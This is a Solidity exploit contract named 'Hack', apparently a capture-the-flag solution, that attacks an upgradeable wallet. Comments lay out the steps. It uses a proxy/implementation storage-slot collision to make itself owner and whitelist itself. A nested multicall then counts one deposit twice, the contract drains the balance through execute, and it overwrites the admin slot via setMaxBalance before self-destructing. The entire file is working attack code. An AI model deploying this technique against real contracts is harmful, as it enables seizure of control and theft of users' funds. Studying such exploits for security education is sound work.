// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Iwallet {
    function admin() external view returns (address);
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external;
    function setMaxBalance(uint256 _maxBalance) external;
    function deposit() external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function multicall(bytes[] calldata data) external payable;
}

contract Hack {
    Iwallet wallet;

    constructor(address target) payable {
        wallet = Iwallet(target);

        /**
         * ****** STEPS ************
         * the storage variables of a proxy and implementation contract shud always be correctly aligned which means making change to either of contracts will reflect in another contract
         * pendingAdmin ----->   owner
         * admin    ------->    maxBalance
         * by using proposeNewAdmin we'll set pendingAdmin(owner) to Hack contract
         * being the owner we can whitelist any address(Hack contract)
         * our main goal is to update setMaxBalance for which 1st condition is satisfied by now
         */

        wallet.proposeNewAdmin(address(this));
        wallet.addToWhitelist(address(this));

        bytes[] memory deposit_data = new bytes[](1);
        deposit_data[0] = abi.encodeWithSelector(wallet.deposit.selector);
        bytes[] memory data = new bytes[](2);
        data[0] = deposit_data[0];
        data[1] = abi.encodeWithSelector(wallet.multicall.selector, deposit_data);
        wallet.multicall{value: 0.001 ether}(data);

        wallet.execute(address(this), 0.002 ether, "");
        wallet.setMaxBalance(uint256(uint160(msg.sender)));
        require(wallet.admin() == msg.sender, "hack failed");

        selfdestruct(payable(msg.sender));
    }
}
